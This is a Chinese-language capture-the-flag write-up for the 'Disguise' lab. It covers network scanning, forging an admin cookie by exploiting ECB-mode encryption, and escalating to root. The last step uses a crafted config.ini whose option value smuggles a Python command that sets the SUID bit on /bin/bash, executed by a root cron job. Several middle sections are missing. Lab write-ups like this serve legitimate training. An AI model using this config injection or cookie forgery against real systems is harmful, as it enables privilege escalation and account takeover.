<div class="markdown-body" id="postBody"><h1>一、信息收集与初步探测</h1>
<h2>1.1 主机发现</h2>
<p>渗透测试的第一步通常是发现网络中的存活主机。这里我们使用<code class="notranslate">arp-scan</code>工具对本地网络进行扫描。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password <span class="pl-k">for</span> kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.211 08:00:27:ea:d3:f5       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f8:d7:c5       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 2.028 seconds (126.23 hosts/sec). 4 responded</pre></div>
<p>扫描结果显示，IP地址为 <code class="notranslate">192.168.205.211</code> 的主机响应了ARP请求，其MAC地址为 <code class="notranslate">08:00:27:ea:d3:f5</code>。该IP将作为我们后续渗透的目标。</p>
<h2>1.2 端口扫描</h2>
<p>确定目标主机后，使用<code class="notranslate">nmap</code>进行端口扫描，以识别目标主机开放的服务。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- --min-rate 10000 192.168.205.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 21:57 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.211
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.20 seconds</pre></div>
<p>Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 80端口 (HTTP服务)。</p>
<h1>二、Web应用渗透测试</h1>
<h2>2.1 域名解析与站点识别</h2>
<p>直接通过IP地址访问目标主机的HTTP服务 (端口80)，发现网页内容提示需要解析域名。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6621c2d1dc57387ecc1d759c8539e863b920d7704b18b82cc207acd476caf52f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531363039353835363635362e77656270"><img src="https://camo.githubusercontent.com/6621c2d1dc57387ecc1d759c8539e863b920d7704b18b82cc207acd476caf52f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531363039353835363635362e77656270" alt="image-20250516095849516" data-canonical-src="https://7r1umphk.github.io/image/20250516095856656.webp" style="max-width: 100%;"></a></p>
<p>根据页面提示，该站点期望通过域名 <code class="notranslate">http://disguise.hmv</code> 访问。我们将此域名与目标IP的映射关系添加到本地 <code class="notranslate">/etc/hosts</code> 文件中。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>192.168.205.211 http://disguise.hmv<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sudo tee -a /etc/hosts <span class="pl-k">&gt;</span> /dev/null

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tail -n 1 /etc/hosts
192.168.205.211 http://disguise.hmv</pre></div>
<p>配置完成后，通过域名 <code class="notranslate">http://disguise.hmv</code> 访问站点。观察页面页脚信息，初步判断该站点是基于WordPress构建的。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/75bdd38cba73de1bbb043b5ac087717f86abb085ba49c92f0585ea339eddbad2/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531363130303834323738312e77656270"><img src="https://camo.githubusercontent.com/75bdd38cba73de1bbb043b5ac087717f86abb085ba49c92f0585ea339eddbad2/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531363130303834323738312e77656270" alt="image-20250516100842676" data-canonical-src="https://7r1umphk.github.io/image/20250516100842781.webp" style="max-width: 100%;"></a></p>
<h2>2.2 WordPress漏洞扫描与信息收集</h2>
<h3>2.2.1 Nuclei扫描</h3>
<p>首先尝试使用<code class="notranslate">nuclei</code>对目标WordPress站点进行自动化漏洞扫描。</p>

└─$ nuclei -u http://disguise.hmv/

<h2>5.1 初步探索与注册功能分析</h2>
<p>查看新站点的页面源码，未发现明显可利用信息。尝试使用之前在WordPress站点发现的用户名 <code class="notranslate">simpleAdmin</code> 进行弱密码登录，失败。<br>
观察注册页面 (register.php)，发现其表单提交时存在前端JavaScript校验函数 <code class="notranslate">validateForm</code>，该函数限制用户名长度不能超过8个字符。</p>
<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-c">// validateForm (部分示例)</span>

    <span class="pl-k">if</span><span class="pl-kos">(</span><span class="pl-s1">username</span><span class="pl-kos">.</span><span class="pl-c1">length</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">8</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
        <span class="pl-en">alert</span><span class="pl-kos">(</span><span class="pl-s">"用户名不能超过8个字符"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
        <span class="pl-k">return</span> <span class="pl-c1">false</span><span class="pl-kos">;</span>
    <span class="pl-kos">}</span>
    <span class="pl-k">return</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span></pre></div>

<ul>
<li>Base64解码后xxd: <code class="notranslate">8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 75dc 985b 21f9 ed16 9358 624d c2ed 3a5b</code> (32字节)</li>

<p>观察15字节和20字节用户名的密文，它们的前16字节完全相同 (<code class="notranslate">8952...f3a8</code>)。这强烈暗示了加密模式为 <strong>ECB (Electronic Codebook)</strong>，且块大小为 <strong>16字节</strong>。</p>
<h3>5.3.2 确认密码不参与Cookie加密</h3>
<p>注册用户 <code class="notranslate">test2</code> (5字节)，密码 <code class="notranslate">1111111111</code> (与之前的 <code class="notranslate">111111</code> 不同)。<br>
<code class="notranslate">dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D</code><br>

密文长度和结构未因密码改变而改变，确认密码不直接参与 <code class="notranslate">dark_session</code> 的加密。</p>
<h3>5.3.3 推断Salt和填充机制</h3>
<p>加密的明文结构推测为 <code class="notranslate">Salt + Username</code>，然后进行PKCS#7填充。</p>
<ul>
<li><code class="notranslate">adminadmin</code> (10字节) + Salt -&gt; 16字节密文 (1块)</li>
<li><code class="notranslate">adminadminadmin</code> (15字节) + Salt -&gt; 32字节密文 (2块)</li>
</ul>
<p>这表明 <code class="notranslate">(Salt长度 + 10)</code> 经过填充后为16字节，而 <code class="notranslate">(Salt长度 + 15)</code> 经过填充后为32字节。<br>
设Salt长度为 <code class="notranslate">S</code>。</p>
<ul>
<li><code class="notranslate">S + 10 &lt;= 16</code></li>
<li><code class="notranslate">S + 15 &gt; 16</code> (因为产生了第二块密文)</li>
</ul>
<p>如果 <code class="notranslate">S = 4</code>：</p>
<ul>
<li><code class="notranslate">4 + 10 = 14</code>字节。PKCS#7填充2字节 (每个字节为<code class="notranslate">\x02</code>)，总共16字节。</li>
<li><code class="notranslate">4 + 15 = 19</code>字节。PKCS#7填充13字节 (每个字节为<code class="notranslate">\x0d</code>)，总共32字节。<br>
这个推断与第一个密文块可能相同的ECB特性吻合。</li>
</ul>
<p>进一步验证Salt长度和PKCS#7填充规则（特别是当数据长度正好是块大小时）：<br>
注册用户 <code class="notranslate">adminadminad</code> (12字节)，密码 <code class="notranslate">111111</code>。<br>
<code class="notranslate">dark_session=iVItH823tj24X11GL%2BrzqMJwkfrsOdSxW16pbszGJLY%3D</code><br>
Base64解码后xxd: <code class="notranslate">8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6</code> (32字节)。<br>
如果Salt为4字节，则 <code class="notranslate">Salt(4) + adminadminad(12) = 16</code>字节。根据PKCS#7填充规则，当数据长度等于块大小时，仍需填充一个完整的16字节块 (16个<code class="notranslate">\x10</code>)。因此总明文长度为32字节，产生32字节密文。这与观察一致，确认 <strong>Salt长度为4字节</strong>。</p>
<h3>5.3.4 伪造simpleAdmin的Cookie</h3>
<p>目标用户 <code class="notranslate">simpleAdmin</code> (11字节)。<br>
服务器实际加密的明文为 <code class="notranslate">Salt(4) + "simpleAdmin"(11) = 15</code>字节。<br>
PKCS#7填充后为 <code class="notranslate">Salt(4) + "simpleAdmin"(11) + "\x01"(padding)</code>，共16字节。</p>
<p>为了获取密文，我们可以注册一个用户名为 <code class="notranslate">simpleAdmin\x01</code> (这里 <code class="notranslate">\x01</code> 是用户名的一部分，总长12字节)。<br>
服务器加密的明文块1将是 <code class="notranslate">Salt(4) + "simpleAdmin\x01"(username_part, 12) = 16</code>字节。<br>
由于正好16字节，会再填充一个16字节的 <code class="notranslate">\x10</code> 块。<br>
但重要的是，第一个16字节明文块的数据与我们目标用户 <code class="notranslate">simpleAdmin</code> 经过填充后的明文块数据是相同的！</p>

<p>发现一个root权限的cron定时任务，每一分钟执行 <code class="notranslate">/usr/bin/python3 /opt/query.py /home/darksoul/config.ini</code>。<br>
查看 <code class="notranslate">/opt/query.py</code> 源码：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">mysql</span>.<span class="pl-s1">connector</span>
<span class="pl-k">import</span> <span class="pl-s1">sys</span>

<span class="pl-k">def</span> <span class="pl-en">main</span>():
    <span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>) <span class="pl-c1">!=</span> <span class="pl-c1">2</span>:
        <span class="pl-en">print</span>(<span class="pl-s">"Usage: python query.py &lt;configfile&gt;"</span>)
        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)

    <span class="pl-s1">cnf</span> <span class="pl-c1">=</span> <span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>[<span class="pl-c1">1</span>]

    <span class="pl-k">try</span>:
        <span class="pl-s1">conn</span> <span class="pl-c1">=</span> <span class="pl-s1">mysql</span>.<span class="pl-c1">connector</span>.<span class="pl-c1">connect</span>(<span class="pl-s1">read_default_file</span><span class="pl-c1">=</span><span class="pl-s1">cnf</span>) <span class="pl-c"># 关键点</span>
        <span class="pl-s1">cursor</span> <span class="pl-c1">=</span> <span class="pl-s1">conn</span>.<span class="pl-c1">cursor</span>()

        <span class="pl-s1">query</span> <span class="pl-c1">=</span> <span class="pl-s">'SELECT COUNT(*) FROM users'</span>
        <span class="pl-s1">cursor</span>.<span class="pl-c1">execute</span>(<span class="pl-s1">query</span>)
        <span class="pl-s1">results</span> <span class="pl-c1">=</span> <span class="pl-s1">cursor</span>.<span class="pl-c1">fetchall</span>()
        <span class="pl-en">print</span>(<span class="pl-s">f"users count:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">results</span>[<span class="pl-c1">0</span>][<span class="pl-c1">0</span>]<span class="pl-kos">}</span></span>"</span>)

        <span class="pl-s1">query</span> <span class="pl-c1">=</span> <span class="pl-s">'SELECT COUNT(*) FROM products'</span>
        <span class="pl-s1">cursor</span>.<span class="pl-c1">execute</span>(<span class="pl-s1">query</span>)
        <span class="pl-s1">results</span> <span class="pl-c1">=</span> <span class="pl-s1">cursor</span>.<span class="pl-c1">fetchall</span>()
        <span class="pl-en">print</span>(<span class="pl-s">f"products count:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">results</span>[<span class="pl-c1">0</span>][<span class="pl-c1">0</span>]<span class="pl-kos">}</span></span>"</span>)
    <span class="pl-k">except</span> <span class="pl-s1">mysql</span>.<span class="pl-c1">connector</span>.<span class="pl-c1">Error</span> <span class="pl-k">as</span> <span class="pl-s1">err</span>:
        <span class="pl-en">print</span>(<span class="pl-s">f"db connect error: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">err</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-k">finally</span>:
        <span class="pl-k">if</span> <span class="pl-s">'cursor'</span> <span class="pl-c1">in</span> <span class="pl-en">locals</span>():
            <span class="pl-s1">cursor</span>.<span class="pl-c1">close</span>()
        <span class="pl-k">if</span> <span class="pl-s">'conn'</span> <span class="pl-c1">in</span> <span class="pl-en">locals</span>() <span class="pl-c1">and</span> <span class="pl-s1">conn</span>.<span class="pl-c1">is_connected</span>():
            <span class="pl-s1">conn</span>.<span class="pl-c1">close</span>()

<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
    <span class="pl-en">main</span>()</pre></div>
<p>脚本使用了 <code class="notranslate">mysql.connector.connect(read_default_file=cnf)</code>，其中<code class="notranslate">cnf</code>是 <code class="notranslate">/home/darksoul/config.ini</code>。<br>
检查 <code class="notranslate">config.ini</code> 的权限。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">darksoul@disguise:<span class="pl-k">~</span>$ ls -la config.ini
-rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini</pre></div>
<p>原 <code class="notranslate">config.ini</code> 是root所有，darksoul不可写。但是darksoul可以删除（因为父目录<code class="notranslate">/home/darksoul</code>是darksoul可写的），然后创建一个同名文件。</p>
<p>我当时是把原来的 <code class="notranslate">config.ini</code> 备份成了 <code class="notranslate">config.ini.bak</code>，然后新建了一个 <code class="notranslate">config.ini</code>。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">darksoul@disguise:<span class="pl-k">~</span>$ mv config.ini config.ini.bak <span class="pl-c"><span class="pl-c">#</span> 如果需要备份</span>
darksoul@disguise:<span class="pl-k">~</span>$ touch config.ini
darksoul@disguise:<span class="pl-k">~</span>$ ls -la config.ini
-rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini</pre></div>
<p>查了一下 <code class="notranslate">mysql-connector-python</code> 的 <code class="notranslate">exploit</code>，google找不到，[<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w" rel="nofollow">wx公众号</a>](<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)%E6%89%BE%E5%88%B0%E4%BA%86%E3%80%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E7%BB%88%E7%82%B9%E6%98%AFwx%E5%85%AC%E4%BC%97%E5%8F%B7%EF%BC%88%E6%BB%91%E7%A8%BD%EF%BC%89%E3%80%82" rel="nofollow">https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)找到了。信息收集的终点是wx公众号（滑稽）。</a><br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/61760020fa3c7710411237563d26f481ab404d7c6fa9396d83e9d79f421a2a59/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531363139313935383738352e77656270"><img src="https://camo.githubusercontent.com/61760020fa3c7710411237563d26f481ab404d7c6fa9396d83e9d79f421a2a59/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531363139313935383738352e77656270" alt="image-20250516191958461" data-canonical-src="https://7r1umphk.github.io/image/20250516191958785.webp" style="max-width: 100%;"></a></p>
<p>构造恶意的 <code class="notranslate">config.ini</code>：</p>
<div class="highlight highlight-source-ini"><pre class="notranslate"><span class="pl-en">[client]</span>
<span class="pl-k">user</span> = dark_db_admin
<span class="pl-k">password</span> = Str0ngPassw0d1***
<span class="pl-k">host</span> = localhost
<span class="pl-k">database</span> = dark_shop
<span class="pl-k">port</span> = int(3306)
<span class="pl-k">allow_local_infile</span>=__import__(<span class="pl-s"><span class="pl-pds">'</span>os<span class="pl-pds">'</span></span>).system(<span class="pl-s"><span class="pl-pds">'</span>chmod u+s /bin/bash<span class="pl-pds">'</span></span>)</pre></div>
<p>这个 <code class="notranslate">allow_local_infile</code> 配置项（或其他可利用的配置项）会被 <code class="notranslate">mysql.connector.connect</code> 解析并执行后面的Python代码，从而给 <code class="notranslate">/bin/bash</code> 加上SUID权限。</p>
<p>等待cron任务执行 (最多1分钟)。可以用 <code class="notranslate">pspy64</code> 监控。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> pspy64 输出中会看到</span>
2025/05/16 07:19:01 CMD: UID=0     PID=16589  <span class="pl-k">|</span> sh -c chmod u+s /bin/bash</pre></div>
<p>检查 <code class="notranslate">/bin/bash</code> 权限。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">darksoul@disguise:<span class="pl-k">~</span>$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash</pre></div>
<p>成功加上SUID权限！执行 <code class="notranslate">bash -p</code> 获取root权限。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">darksoul@disguise:<span class="pl-k">~</span>$ bash -p
bash-5.0# id
uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
bash-5.0# cat /root/root.txt
<span class="pl-c"><span class="pl-c">#</span>Congratulations!!!</span>
hmv{CVE-2025-21548}</pre></div>
<p>成功获取root权限并读取 <code class="notranslate">/root/root.txt</code> 中的flag: <code class="notranslate">hmv{CVE-2025-21548}</code>。</p>
<h1>八、总结</h1>
<p>本次Disguise靶机的渗透过程涉及了Web应用层面的信息收集、漏洞扫描、子域名爆破，以及针对ECB加密模式下Cookie的巧妙伪造。后续通过对系统内部文件和进程的分析，发现了数据库凭证泄露和cron定时任务的配置不当，最终结合Python库的特性实现了权限提升至root。整个过程环环相扣，充分展现了信息收集和漏洞利用的重要性。</p></div>

function iFrameLoading(){

    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});
